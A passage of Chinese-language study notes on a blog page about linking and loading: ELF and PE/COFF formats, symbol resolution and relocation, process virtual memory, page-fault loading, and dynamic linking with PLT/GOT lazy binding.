align="left">ET_EXEC</td><td>2</td><td>可执行文件</td></tr><tr><td align="left">ET_DYN</td><td>3</td><td>共享目标文件，一般为.so文件</td></tr></tbody></table><h3 id="机器类型"><a href="#机器类型" class="headerlink" title="机器类型"></a>机器类型</h3><table><thead><tr><th>常量</th><th>值</th><th>含义</th></tr></thead><tbody><tr><td>EM_M32</td><td>1</td><td>AT&amp;T WE 32100</td></tr><tr><td>EM_SPARC</td><td>2</td><td>SPARC</td></tr><tr><td>EM_386</td><td>3</td><td>Inter x86</td></tr><tr><td>EM_68K</td><td>4</td><td>Motorola 68000</td></tr><tr><td>EM_88K</td><td>5</td><td>Motorola 88000</td></tr><tr><td>EM_860</td><td>6</td><td>Intel 80860</td></tr></tbody></table><h3 id="段表"><a href="#段表" class="headerlink" title="段表"></a>段表</h3><p>段表是一个描述了ELF文件包含的所有段的信息，比如每个段的段名、段的长度、在文件中的偏移、读写权限及段的其他属性。</p><p>ELF文件的段结构就是由段表决定的，编译器、链接表和装载器都是依靠段表来定位和访问各个段的属性的。</p><h3 id="重定位表"><a href="#重定位表" class="headerlink" title="重定位表"></a>重定位表</h3><h3 id="字符串表"><a href="#字符串表" class="headerlink" title="字符串表"></a>字符串表</h3><p>包含字符串表和段表字符串表</p><h2 id="符号-1"><a href="#符号-1" class="headerlink" title="符号"></a>符号</h2><p>在链接中，将函数和变量统称为符号，函数名或变量名就是符号名</p><p>每一个目标文件都会有一个相应的符号表，其中记录了目标文件中所用到的所有符号。每个定义的符号都有一个对应的值，叫做符号值，对于变量和函数来说，符号值就是它们的地址。</p><h3 id="强符号"><a href="#强符号" class="headerlink" title="强符号"></a>强符号</h3><h3 id="弱符号"><a href="#弱符号" class="headerlink" title="弱符号"></a>弱符号</h3><p>编译器将未初始化的全局变量定义作若符号处理。</p><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><h4 id="强引用"><a href="#强引用" class="headerlink" title="强引用"></a>强引用</h4><p>若对外部目标文件的符号引用在目标文件被最终链接成可执行文件时，它们需要正确决议，如果没有找到该符号的定义，连接器就会报错，这种被称为强引用</p><h4 id="弱引用"><a href="#弱引用" class="headerlink" title="弱引用"></a>弱引用</h4><p>在处理弱引用时，如果该符号有定义，则链接器将该符号的引用决议；如果该符号未被定义，则链接器对该引用不报错。</p><p>一般对未定义的弱引用，链接器默认其为0，或者是一个特殊的值。</p><h1 id="静态链接-1"><a href="#静态链接-1" class="headerlink" title="静态链接"></a>静态链接</h1><h2 id="空间与地址分配"><a href="#空间与地址分配" class="headerlink" title="空间与地址分配"></a>空间与地址分配</h2><p>“链接器为目标文件分配地址和空间。”这句话中的””地址和空间有两个含义：一是在输出的可执行文件中的空间；二是在装载后的虚拟地址中的虚拟空间。</p><h3 id="按序叠加"><a href="#按序叠加" class="headerlink" title="按序叠加"></a>按序叠加</h3><p>将输入的目标文件安装次序叠加。</p><h3 id="相似段合并"><a href="#相似段合并" class="headerlink" title="相似段合并"></a>相似段合并</h3><p>将相同性质的段合并到一起</p><h3 id="两步链接"><a href="#两步链接" class="headerlink" title="两步链接"></a>两步链接</h3><h4 id="第一步：空间与地址分配"><a href="#第一步：空间与地址分配" class="headerlink" title="第一步：空间与地址分配"></a>第一步：空间与地址分配</h4><p>扫描所以的输入目标文件，并且获得它们的各个段的长度、属性和位置，并且将输入目标文件中的符号表中所以符号定义和符号引用收集起来，统一放到一个全局符号表。这一步中，链接器将能够获得所有输入目标文件的段长度，并且将它们合并，计算出输出文件中各个段合并后的长度和位置，并建立映射关系。</p><h4 id="第二步：符号解析与重定位"><a href="#第二步：符号解析与重定位" class="headerlink" title="第二步：符号解析与重定位"></a>第二步：符号解析与重定位</h4><p>使用上面第一步中收集到的所有信息，读取输入文件中段的数据、重定位信息，并且进行符号解析与重定位、调整代码中的地址等。第二步是链接过程的核心，特别是重定位过程。</p><h4 id="VMA和LMA"><a href="#VMA和LMA" class="headerlink" title="VMA和LMA"></a>VMA和LMA</h4><p>VMA表示虚拟地址，LMA表示加载地址，正常情况下是一致的，但有些嵌入式系统中，LMA和VMA不同。</p><p>链接前，目标文件中的所有段的VMA都是0，因为虚拟空间还没有被分配，所以默认都是0；链接后，可执行文件中的各个段都被分配到了相应的虚拟地址。</p><h3 id="符号地址的确定"><a href="#符号地址的确定" class="headerlink" title="符号地址的确定"></a>符号地址的确定</h3><h2 id="符号解析与重定位"><a href="#符号解析与重定位" class="headerlink" title="符号解析与重定位"></a>符号解析与重定位</h2><h3 id="重定位-1"><a href="#重定位-1" class="headerlink" title="重定位"></a>重定位</h3><p>在链接阶段，根据符号的地址把每个在编译器时预留的临时假地址修正为真正的地址。</p><h3 id="重定位表-1"><a href="#重定位表-1" class="headerlink" title="重定位表"></a>重定位表</h3><p>重定位表也叫重定位段，用来报存与重定位相关的信息，描述如何修改相应的段里的内容。</p><p>每个要被重定位的地方叫一个重定位入口，重定位入口的偏移表示该入口在要被重定位的段中的位置。</p><h3 id="符号解析"><a href="#符号解析" class="headerlink" title="符号解析"></a>符号解析</h3><p>重定位的过程中，每个重定位的入口都是对一个符号的引用，那么当链接器需要对某个符号的引用进行重定位时，它就要求顶这个符号的目标地址。这时候链接器就会去查找由所有输入目标文件的符号表组成的全局符号表，找到相应的符号后进行重定位。</p><h3 id="指令修正方式"><a href="#指令修正方式" class="headerlink" title="指令修正方式"></a>指令修正方式</h3><h4 id="寻址方式"><a href="#寻址方式" class="headerlink" title="寻址方式"></a>寻址方式</h4><p>近址寻址或远址寻址</p><p>绝对寻址或相对寻址</p><p>寻址长度为8位、16位、32位或64位</p><h4 id="32位x86下的ELF修正方式"><a href="#32位x86下的ELF修正方式" class="headerlink" title="32位x86下的ELF修正方式"></a>32位x86下的ELF修正方式</h4><p>绝对近址32位寻址</p><p>相对近址32位寻址</p><p>这两种重定位方式指令修正方式：每个被修正的位置的长度都是32位，即4个字节；而且都是近址寻址，不用考虑段间远址寻址。</p><table><thead><tr><th>宏定义</th><th>值</th><th>重定位修正方法</th></tr></thead><tbody><tr><td>R_386_32</td><td>1</td><td>绝对寻址修正 S+A</td></tr><tr><td>R_386_PC32</td><td>2</td><td>相对寻址修正 S+A-P</td></tr></tbody></table><p>A=保存在被修正位置的值</p><p>P=被修正的位置（相对于段开始的偏移量或者虚拟地址）。注意：该值可通过r_offset计算得到</p><p>S=符号的实际地址，即由r_info的高24位指定的符号的实际地址</p><p>即绝对寻址修正后的地址为该符号的实际地址；相对寻址修正后的地址为符号距离被修正位置的地址差。</p><h2 id="COMMON块"><a href="#COMMON块" class="headerlink" title="COMMON块"></a>COMMON块</h2><h2 id="C-相关问题"><a href="#C-相关问题" class="headerlink" title="C++相关问题"></a>C++相关问题</h2><h3 id="重复代码消除"><a href="#重复代码消除" class="headerlink" title="重复代码消除"></a>重复代码消除</h3><h4 id="函数级别链接"><a href="#函数级别链接" class="headerlink" title="函数级别链接"></a>函数级别链接</h4><h3 id="全局构造与析构"><a href="#全局构造与析构" class="headerlink" title="全局构造与析构"></a>全局构造与析构</h3><h3 id="init段和-fini段"><a href="#init段和-fini段" class="headerlink" title=".init段和.fini段"></a>.init段和.fini段</h3><p>如果将一个函数放到.init或.fini段中，在main函数执行前后执行后会执行这个函数。</p><h4 id="init段"><a href="#init段" class="headerlink" title=".init段"></a>.init段</h4><p>保存的是可执行指令，他构成了进程的初始化代码。因此，当一个程序开始运行时，在main函数被调用之前，Glibc的初始化部分安排执行这个段中的代码。</p><h4 id="fini段"><a href="#fini段" class="headerlink" title=".fini段"></a>.fini段</h4><p>保存着进程终止代码指令。因此，当一个程序的main函数正常退出时，Glibc会安排执行这个段中的代码。</p><h3 id="C-与ABI"><a href="#C-与ABI" class="headerlink" title="C++与ABI"></a>C++与ABI</h3><h4 id="ABI"><a href="#ABI" class="headerlink" title="ABI"></a>ABI</h4><p>我们把符号修饰标准、变量内存布局、函数调用方式等这些跟可执行代码二进制兼容性相关的内容称为ABI。</p><p>影响ABI的因素很多，硬件、编程语言、编译器、链接器、操作系统等都会影响ABI。对于C语言的目标代码来说，以下几个方面会决定目标文件之间是否二进制兼容：</p><ol><li>内置类型（如int、float、char等）的大小和在存储器中的放置方式（大端、小端、对齐方式等）。</li><li>组合类型（如struct、union、数组等）的存储方式和内存分布。</li><li>外部符号与用户定义的符号之间的命名方式和解析方式，如函数名func在C语言的目标文件中是否被解析成外部符号_func。</li><li>函数调用方式，如参数入栈顺序、返回值如何保持等。</li><li>堆栈的分布方式，比如参数和局部变量在堆栈里的位置，参数传递方法等。</li><li>寄存器使用约定，函数调用时哪些寄存器可以修改，哪些需要保存，等等。</li></ol><p>对于C++来说，还有以下方面：</p><ol><li>继承类体系的内存分布，如基类、虚基类在继承类中的位置等。</li><li>指向成员函数的指针的内存分布，如何通过指向成员函数的指针来调用成员函数，如何传递this指针。</li><li>如何调用虚函数，vtable的内存和分布形式，vtable指针在object中的位置等。</li><li>template如何实例化。</li><li>外部符号的修饰。</li><li>全局对象的构造和析构。</li><li>异常的产生和捕获机制。</li><li>标准库的细节问题，RTTI如何实现等。</li><li>内嵌函数访问细节</li></ol><h2 id="静态库链接"><a href="#静态库链接" class="headerlink" title="静态库链接"></a>静态库链接</h2><h2 id="链接过程控制"><a href="#链接过程控制" class="headerlink" title="链接过程控制"></a>链接过程控制</h2><h3 id="链接控制脚本"><a href="#链接控制脚本" class="headerlink" title="链接控制脚本"></a>链接控制脚本</h3><p>一般的链接器控制链接过程有如下三种方法：</p><ol><li>使用命令行来给链接器指定参数。</li><li>将链接指令存放在目标文件里面，编译器经常会通过这种方法想链接器传递指令。</li><li>使用链接器控制脚本(可以使用ld -verbose来查看ld默认的链接脚本，通过ld -T link.script可以指定脚本为链接控制脚本)</li></ol><h3 id="ld链接脚本"><a href="#ld链接脚本" class="headerlink" title="ld链接脚本"></a>ld链接脚本</h3><h1 id="Windows-PE-COFF"><a href="#Windows-PE-COFF" class="headerlink" title="Windows PE/COFF"></a>Windows PE/COFF</h1><h2 id="Windows的二进制文件格式PE-COFF"><a href="#Windows的二进制文件格式PE-COFF" class="headerlink" title="Windows的二进制文件格式PE/COFF"></a>Windows的二进制文件格式PE/COFF</h2><h2 id="PE的前身——COFF"><a href="#PE的前身——COFF" class="headerlink" title="PE的前身——COFF"></a>PE的前身——COFF</h2><p>COFF的文件头部包括两部分：一是描述文件总体结构和属性的映像头，另外一个是描述该文件中包含的段属性的段表。文件头后紧跟着的就是文件的段，包括代码段、数据段等，最后还有符号表等。除此之外，还有两个ELF文件中不存在的段：”.drectve段”和”.debug$S段”</p><h3 id="映像"><a href="#映像" class="headerlink" title="映像"></a>映像</h3><p>因为PE文件在装载时直接被映射到进程的虚拟空间中运行，它是进程的虚拟空间的映像。所以PE可执行文件很多时候被叫做映像文件。</p><h3 id="段属性"><a href="#段属性" class="headerlink" title="段属性"></a>段属性</h3><p>每个段所拥有的属性包括：段名、物理地址、虚拟地址、原始数据大小、段在文件中的位置、该段的重定位表在文件中的位置、该段的行号表在文件中的位置、标志位。</p><h2 id="链接指示信息（-drectve）"><a href="#链接指示信息（-drectve）" class="headerlink" title="链接指示信息（.drectve）"></a>链接指示信息（.drectve）</h2><p>“.drectve”实际上是”Directive”的缩写，它的内容是编译器传递给链接器的指令，即编译器希望告诉链接器应该怎样链接这个目标文件。</p><p>该段最后一个属性标志位flags，为0x100A00，其意义如下：</p><table><thead><tr><th>标志位</th><th>宏定义</th><th>意义</th></tr></thead><tbody><tr><td>0x00100000</td><td>IMAGE_SCN_ALLGN</td><td>1个字节对齐。相当于不对齐</td></tr><tr><td>0x00000800</td><td>IMAGE_SCN_LNK_REMOVE</td><td>最终链接成映像文件时抛弃该段</td></tr><tr><td>0x00000200</td><td>IMAGE_SCN_LNK_INFO</td><td>该段包含的是注释或其他信息</td></tr></tbody></table><h2 id="调试信息-debug"><a href="#调试信息-debug" class="headerlink" title="调试信息(.debug)"></a>调试信息(.debug)</h2><p>COFF文件中所有以”.debug”开始的段都包含着调试信息。</p><p>比如”.debug$S”表示包含的是符号相关的调试信息；”.debug$P”表示包含预编译头文件相关的信息；”.debug$T”表示包含类型相关的调试信息。</p><h2 id="COFF符号表"><a href="#COFF符号表" class="headerlink" title="COFF符号表"></a>COFF符号表</h2><p>COFF文件的符号表包含的内容几乎和ELF文件的符号表一样，主要就是符号名、符号类型、所在位置。</p><h2 id="Windows下的ELF——PE"><a href="#Windows下的ELF——PE" class="headerlink" title="Windows下的ELF——PE"></a>Windows下的ELF——PE</h2><p>PE文件是基于COFF的扩展，它比COFF文件多了几个结构。最主要的变化有两个：第一个是文件最开始的部分不是COFF文件头，而是DOS MZ可执行文件格式的文件头和桩代码；第二个变化是原来的COFF文件头中的”IMAGE_FILE_HEADER”部分扩展成了PE文件文件头结构”IMAGE_NT_HEADERS”，这个结构包括了原来的”Image Header”及新增的PE扩展头部结构。</p><h3 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h3><p>“IMAGE_NT_HEADERS”是PE真正的文件头，它包含了一个标记和两个结构体。标记是一个常量，对于一个合法的PE文件来说，它的值为0x00004550，按照小端字节序，它对应的是”P”、”E”、”\0”、”\0”这四个字符的ASCII码。文件头包含的两个结构分别是映像头、PE扩展头部文件结构。</p><h3 id="PE数据目录"><a href="#PE数据目录" class="headerlink" title="PE数据目录"></a>PE数据目录</h3><p>在Windows系统装载PE可执行文件时，往往需要很快地找到一些装载所需要的数据结构，比如导入表、导出表、资源、重定位表等。这些常用的数据的位置和长度都保存在了一个叫数据目录的结构里面，其实它就是前面”IMAGE_OPTIONAL_HEADER”结构里面的”DataDirectory”成员。这个成员是一个”IMAGE_DATA_DIRECTORY”的结构数组。</p><p>该结构大小为16，包含两个成员，分别是虚拟地址以及长度。DataDirectory数组里每一个袁术都对应一个包含一定含义的表。</p><h1 id="可执行文件的装载与进程"><a href="#可执行文件的装载与进程" class="headerlink" title="可执行文件的装载与进程"></a>可执行文件的装载与进程</h1><h2 id="进程虚拟地址空间"><a href="#进程虚拟地址空间" class="headerlink" title="进程虚拟地址空间"></a>进程虚拟地址空间</h2><p>每个程序被运行起来以后，它将拥有自己独立的虚拟地址空间，这个虚拟地址空间的大小有计算机的硬件平台决定，具体地说是CPU的位数决定的：</p><p>32位的硬件平台虚拟地址空间的地址为 0x00000000~0xFFFFFFFF。</p><p>64位的硬件平台虚拟空间的地址为 0x0000000000000000~0XFFFFFFFFFFFFFFFF。</p><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>Linux的操作系统将虚拟地址空间分为两部分：</p><p>其中操作系统本身用去了一部分：从地址0xC0000000到0xFFFFFFFF，共1GB。</p><p>剩下的留给进程使用：从地址0x00000000到0xBFFFFFFF，共3GB。</p><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>对于Windows操作系统来说，它的进程虚拟地址空间划分是操作系统占用2GB，进程只剩下2GB。另外Windows有个启动参数可以将操作系统占用的虚拟地址空间减少到1GB，即跟Linux分布一样。</p><h3 id="PAE"><a href="#PAE" class="headerlink" title="PAE"></a>PAE</h3><p>从硬件层面上来讲，原先的32位地址线只能访问最多4GB的物理内存。但是自从扩展至36位地址线之后，Intel修改了页映射的方式，使得新的映射方式可以访问到更多的物理内存，Intel把这个地址扩展方式叫做PAE。</p><p>在应用程序里，只有32位的虚拟地址空间，但是操作系统提供一个窗口映射的方法，把这些额外的内存映射到进程地址空间中来，应用程序可以根据需要来选择申请和映射。在Windows下，这种访问内存的操作方式叫做AWE；而想Linux等UNIX类操作系统则采用mmap()系统调用来实现。</p><h2 id="装载的方式"><a href="#装载的方式" class="headerlink" title="装载的方式"></a>装载的方式</h2><p>程序运行时是有局部性原理的，所以可以将程序最常用的部分驻留在内存中，而将一些不太常用的数据存放在磁盘里面，这就是动态装入的基本原理。</p><p>覆盖装入和页映射是两种很典型的动态装载方法，原则上都是利用了程序的局部性原理。</p><p>动态装入的思想是程序用到哪个模块，就将哪个模块装入内存，如果不用就暂时不装入，存放在磁盘中。</p><h3 id="覆盖装入"><a href="#覆盖装入" class="headerlink" title="覆盖装入"></a>覆盖装入</h3><p>覆盖装入的方法把挖掘内存潜力的任务交给了程序员，程序员在编写程序的时候必须手工将程序分割成若干块，然后编写一个小的辅助代码来管理这些模块何时应该驻留内存而何时应该被替换掉。这个小的辅助代码就是所谓的覆盖管理器。</p><p>在多个模块的情况下，程序员需要手工将模块按照它们之间的调用依赖关系组织成树状结构。同时，覆盖管理器需要保证两点：</p><ol><li>这个树状结构中从任何一个模块到树的根的模块都叫调用路径。当该块被调用时，整个调用路径上的模块必须都在内存中。</li><li>禁止跨树间调用。任意一个模块不允许跨过树状结构进行调用。</li></ol><h3 id="页映射"><a href="#页映射" class="headerlink" title="页映射"></a>页映射</h3><p>页映射是将内存和所有磁盘中的数据和指令按照”页”为单位划分成若干个页，以后所有的装载和操作的单位就是页。以目前的情况，硬件规定的页的大小有4096字节、8192字节、2MB、4MB等，最常见的Intel IA32处理器一般都使用4096字节的页。</p><p>装载管理器需要放弃当前的页以装入新页时有多重算法，如先进先出算法(FIFO)、最少使用算法(LUR)等。</p><p>这个所谓的装载管理器就是现代的操作系统，更加准确的将就是操作系统的存储管理器，比如Windows对PE文件的装载以及Linux对ELF文件的装载都是这样完成的。</p><h2 id="从操作系统角度看可执行文件的装载"><a href="#从操作系统角度看可执行文件的装载" class="headerlink" title="从操作系统角度看可执行文件的装载"></a>从操作系统角度看可执行文件的装载</h2><h3 id="进程的建立"><a href="#进程的建立" class="headerlink" title="进程的建立"></a>进程的建立</h3><p>从操作系统的角度来看，一个进程最关键的特征就是它拥有独立的虚拟地址空间。</p><p>在有虚拟存储的情况下，进程的建立过程最开始只需要做三件事：</p><ol><li>创建一个独立的虚拟地址空间</li><li>读取可执行文件头，并且建立虚拟空间与可执行文件的映射关系</li><li>将CPU的指令寄存器设置成可执行文件的入口地址，启动运行。</li></ol><h4 id="创建虚拟空间"><a href="#创建虚拟空间" class="headerlink" title="创建虚拟空间"></a>创建虚拟空间</h4><p>虚拟空间由一组页映射函数将虚拟空间的各个页映射至相应的物理空间。创建一个虚拟空间实际上并不是创建空间而是创建映射函数所需要的相应的数据结构。在i386的Linux下，创建虚拟地址空间实际上只是分配一个页目录就可以了，甚至不设置页映射关系，这些映射关系等到后面程序发生页错误的时候再进行设置。</p><h4 id="读取可执行文件头，并且建立虚拟空间与可执行文件的映射关系"><a href="#读取可执行文件头，并且建立虚拟空间与可执行文件的映射关系" class="headerlink" title="读取可执行文件头，并且建立虚拟空间与可执行文件的映射关系"></a>读取可执行文件头，并且建立虚拟空间与可执行文件的映射关系</h4><p>当程序执行发生页错误时，操作系统将从物理内存中分配一个物理页，然后将该”缺页”从磁盘中读取到内存中，再设置缺页的虚拟页和物理页的映射关系，这样程序才得以正常运行。</p><p>虚拟空间与可执行文件之间的映射关系则是：当操作系统捕获到缺页错误时，它应知道程序当前所需要的的页在可执行文件中的哪一个位置。</p><p>从某种角度来看，这一步是整个装载过程中最重要的一步，也是传统意义上”装载”的过程。</p><p>这种映射关系只是保存在操作系统内部的一个数据结构。Linux中将进程虚拟空间中的一个段叫做虚拟内存区域；在Windows中将这个叫做虚拟段。</p><p>操作系统在内部保存这种结构。当程序执行发生段错误时，它可以通过查找这个一个数据结构来定位错误页在可执行文件中的位置。</p><h4 id="将CPU指令寄存器设置成可执行文件入口，启动运行"><a href="#将CPU指令寄存器设置成可执行文件入口，启动运行" class="headerlink" title="将CPU指令寄存器设置成可执行文件入口，启动运行"></a>将CPU指令寄存器设置成可执行文件入口，启动运行</h4><p>操作系统通过设置CPU的指令寄存器将控制权交给进程，由此进程开始执行。</p><p>在操作系统层面上，它涉及内核堆栈和用户堆栈的切换、CPU运行权限的切换。</p><p>从进程的角度看，可以简单地任务操作系统执行了一条跳转指令，直接跳转到可执行文件的入口地址，即ELF文件头中保存的入口地址。</p><h3 id="页错误"><a href="#页错误" class="headerlink" title="页错误"></a>页错误</h3><p>上面布置执行完以后，操作系统只是通过可执行文件头部的信息建立起可执行文件和进程虚存之间的映射关系而已，真正的指令和数据都未被装入到内存中。</p><p>当CPU可是执行程序时，发现页面是一个空页面，于是认为这是一个页错误。CPU将控制权交给操作系统，操作系统查询第二步建立的数据结构，找到空页面所在的VMA，计算出相应的页面在可执行文件中的偏移，然后再物理内存中分配一个物理页面，将精彩中该虚拟页与分配的物理页之间建立映射关系，然后把控制权再还给进程，进程从刚才页错误的位置重新开始执行。</p><h2 id="进程虚存空间分布"><a href="#进程虚存空间分布" class="headerlink" title="进程虚存空间分布"></a>进程虚存空间分布</h2><h3 id="ELF文件链接视图和执行视图"><a href="#ELF文件链接视图和执行视图" class="headerlink" title="ELF文件链接视图和执行视图"></a>ELF文件链接视图和执行视图</h3><p>对于相同权限的段，把它们合并到一起当作一个段进行映射。</p><h4 id="Segment"><a href="#Segment" class="headerlink" title="Segment"></a>Segment</h4><p>ELF中的一个概念，实际上是从装载的角度重新划分了ELF的各个段。在将目标文件链接成可执行文件时，链接器会尽量把相同权限属性的段分配在同一空间。在ELF中把这些属性相似、又连在一起的段叫做一个”Segment”。</p><p>描述”Segment”的结构叫做程序头，它描述了ELF文件该如何被操作系统映射到进程的虚拟空间。</p><p>ELF可执行文件中有一个专门的数据结构叫做程序头表，用来保存”Segment”的信息。因为ELF目标文件不需要被装载，所以它没有程序头表，而ELF的可执行文件和共享库文件都有。</p><h4 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h4><p>从”Section”的角度来看ELF文件就是连接视图，从”Segment”的角度来看就是执行视图。</p><h3 id="堆和栈"><a href="#堆和栈" class="headerlink" title="堆和栈"></a>堆和栈</h3><p>段中文件所在设备主设备号和次设备号及文件节点号都是0，则表示没有映射到文件中，这种VMA叫做匿名虚拟内存区域。堆和栈属于这种段。</p><h4 id="进程虚拟空间的概念"><a href="#进程虚拟空间的概念" class="headerlink" title="进程虚拟空间的概念"></a>进程虚拟空间的概念</h4><p>操作系统通过给进程空间划分出一个个VMA来管理进程的虚拟空间；基本原则是将相同权限属性、有相同映像文件的映射成一个VMA；一个进程基本上可以分为如下几种VMA区域：</p><p>代码VMA，权限只读、可执行；有映像文件。</p><p>数据VMA，权限可读写、可执行；有映像文件。</p><p>堆VMA，权限可读写、可执行；无映像文件，匿名，可向上扩展。</p><p>栈VMA，权限可读写、不可执行；无映像文件，匿名，可向下扩展。</p><h4 id="Linux的进程虚拟空间管理的VMA的概念"><a href="#Linux的进程虚拟空间管理的VMA的概念" class="headerlink" title="Linux的进程虚拟空间管理的VMA的概念"></a>Linux的进程虚拟空间管理的VMA的概念</h4><p>Linux规定一个VMA可以映射到某个文件的一个区域，或者是没有映射到任何文件。</p><h4 id="vdso"><a href="#vdso" class="headerlink" title="vdso"></a>vdso</h4><p>一个内核模块，进程可以通过访问这个VMA来跟内核进行一些通信。<strong><em>具体可参考Linux内核模块的资料。</em></strong></p><h3 id="堆的最大申请数量"><a href="#堆的最大申请数量" class="headerlink" title="堆的最大申请数量"></a>堆的最大申请数量</h3><h3 id="段地址对齐"><a href="#段地址对齐" class="headerlink" title="段地址对齐"></a>段地址对齐</h3><p>在ELF文件中，对于任何一个可装载的”Segment”，它的p_vaddr除以对齐属性的余数等于p_offset除以对齐属性的余数。</p><h3 id="进程栈初始化"><a href="#进程栈初始化" class="headerlink" title="进程栈初始化"></a>进程栈初始化</h3><h2 id="Linux内核装载ELF过程简介"><a href="#Linux内核装载ELF过程简介" class="headerlink" title="Linux内核装载ELF过程简介"></a>Linux内核装载ELF过程简介</h2><h2 id="Windows-PE的装载"><a href="#Windows-PE的装载" class="headerlink" title="Windows PE的装载"></a>Windows PE的装载</h2><h1 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h1><p>动态链接的基本思想：把程序安装模块拆分成各个相对独立部分，在程序运行时才将它们链接在一起形成一个完成的程序。</p><p>当程序被装载时，系统的动态链接器会将程序所需的所有动态链接库装载到进程的地址空间，并且将程序中所有未决议的符号绑定到相应的动态链接库中，并进行重定位工作。</p><p>动态链接器：ld-x.x.so。</p><h2 id="地址无关代码"><a href="#地址无关代码" class="headerlink" title="地址无关代码"></a>地址无关代码</h2><p>PIE：地址无关可执行文件</p><h2 id="延迟绑定-PLT"><a href="#延迟绑定-PLT" class="headerlink" title="延迟绑定(PLT)"></a>延迟绑定(PLT)</h2><p>当函数第一次被用到时才进行绑定（符号查找、重定位等）。</p><h6 id="理论上plt的结构："><a href="#理论上plt的结构：" class="headerlink" title="理论上plt的结构："></a>理论上plt的结构：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">func@plt:</span><br><span class="line"></span><br><span class="line">jmp *(func@GOT)</span><br><span class="line"></span><br><span class="line">pust n</span><br><span class="line"></span><br><span class="line">push moduleID</span><br><span class="line"></span><br><span class="line">jump _dl_runtime_resolve</span><br></pre></td></tr></table></figure><p>其中n为func这个符号引用在重定位表”.rel.plt”中的下标。moduleID为模块的ID。</p><h6 id="真实："><a href="#真实：" class="headerlink" title="真实："></a>真实：</h6><p>.got前三项含义：</p><ol><li>第一项保存的是”.dynamic”段的地址，这个段描述了本模块动态链接相关的信息。</li><li>第二项保存的是本模块的ID。</li><li>第三项保存的是_dl_runtime_resolve()的地址。</li></ol><p>同时，PLT的中把上面最后两条指令放到PLT中的第一项。</p><h2 id="动态链接相关结构"><a href="#动态链接相关结构" class="headerlink" title="动态链接相关结构"></a>动态链接相关结构</h2><h3 id="“-interp”段"><a href="#“-interp”段" class="headerlink" title="“.interp”段"></a>“.interp”段</h3><p>该段保存一个字符串，即可执行文件所需要的动态链接器(ld.so)的路径。</p><h3 id="“-dynamic”段"><a href="#“-dynamic”段" class="headerlink" title="“.dynamic”段"></a>“.dynamic”段</h3><p>这个段里保存了动态链接器所需要的基本信息，比如依赖于哪些共享对象、动态链接符号表的位置、动态链接重定位表的位置、共享对象初始化代码的地址等。</p><p>可看作动态链接下ELF文件的”文件头”</p><h3 id="“-dynsym”段-动态符号表"><a href="#“-dynsym”段-动态符号表" class="headerlink" title="“.dynsym”段(动态符号表)"></a>“.dynsym”段(动态符号表)</h3><p>“.dynsym”只保存的了与动态链接相关的符号</p><p>“.dynstr”动态符号字符串表</p><h3 id="动态链接重定位表"><a href="#动态链接重定位表" class="headerlink" title="动态链接重定位表"></a>动态链接重定位表</h3><p>“.rel.dyn”和”.rel.plt”</p><p>“.rel.dyn”对数据引用的修正，它所修正的位置位于”.got”以及数据段</p><p>“.rel.plt”是对函数引用的修正，它所修正的位置位于”.got.plt”。</p><h3 id="动态链接时进程堆栈初始化信息"><a href="#动态链接时进程堆栈初始化信息" class="headerlink" title="动态链接时进程堆栈初始化信息"></a>动态链接时进程堆栈初始化信息</h3><p>进程初始化时，堆栈里保存了关于进程执行环境和命令行参数等信息。事实上，堆栈里还保存了动态链接器所需要的一些辅助信息数组。</p><h2 id="动态链接的步骤和实现"><a href="#动态链接的步骤和实现" class="headerlink" title="动态链接的步骤和实现"></a>动态链接的步骤和实现</h2><p>动态链接的步骤基本上分为3步：先是启动动态链接器本身，然后装载所需要的共享对象，最后是重定位和初始化。</p><h3 id="动态链接器自举"><a href="#动态链接器自举" class="headerlink" title="动态链接器自举"></a>动态链接器自举</h3><p>自举：具有一定限制条件的启动代码。</p><p>动态链接器入口地址即是自举代码的入口，当操作系统将进程控制权交给动态链接器时，动态链接器的自举代码即开始执行。自举代码首先会找到它自举的GOT，而GOT的第一个入口保存的即是”.dynamic”段的偏移地址，由此找到了动态链接器本身的”.dynamic”段。通过”.dynamic”中的信息，自举代码便可以获得动态链接器本身的重定位表和符号表等，从而得到动态链接器本身的重定位入口，先将它们全部重定位。</p><h3 id="装载共享对象"><a href="#装载共享对象" class="headerlink" title="装载共享对象"></a>装载共享对象</h3><p>完成基本自举后，动态链接器将可执行文件和链接器本身的符号表都合并到一个符号表中，我们可以称它为全局符号表。然后链接器开始寻找可执行问所依赖的共享对象（.dynamic中类型的入口是DT_NEEDED支出了该可执行文件所依赖的共享对象），并将这些共享对象的名字放入到一个装载集合中。然后链接器开始从集合里取出一个所需要的的共享对象的名字，找到相应的文件后打开该文件，读取相应的ELF文件头和”.dynamic”段，然后将它相应的代码段和数据段映射到进程空间中。如果这个ELF共享对象还依赖于其他共享对象，那么将所依赖的共享对象的名字放到装载集合中。如此循环知道所有依赖的共享对象都被装载进来为止。当一个新的共享对象被装载进来的时候，它的符号表会被合并到全局符号表中，所以当所有的共享对象都被装载进来的时候，全局符号表里面将包含进程中所有的动态链接所需要的符号。</p><p>这个过程中，链接器可以有不同的装载顺序，如使用深度优先或者广度优先算法等，比较常见的算法一般都是广度优先的。</p><h4 id="符号优先级"><a href="#符号优先级" class="headerlink" title="符号优先级"></a>符号优先级</h4><h5 id="全局符号介入"><a href="#全局符号介入" class="headerlink" title="全局符号介入"></a>全局符号介入</h5><p>当一个符号需要被加入全局符号表时，如果相同的符号名已经存在，则后加入的符号被忽略。</p><h3 id="重定位和初始化"><a href="#重定位和初始化" class="headerlink" 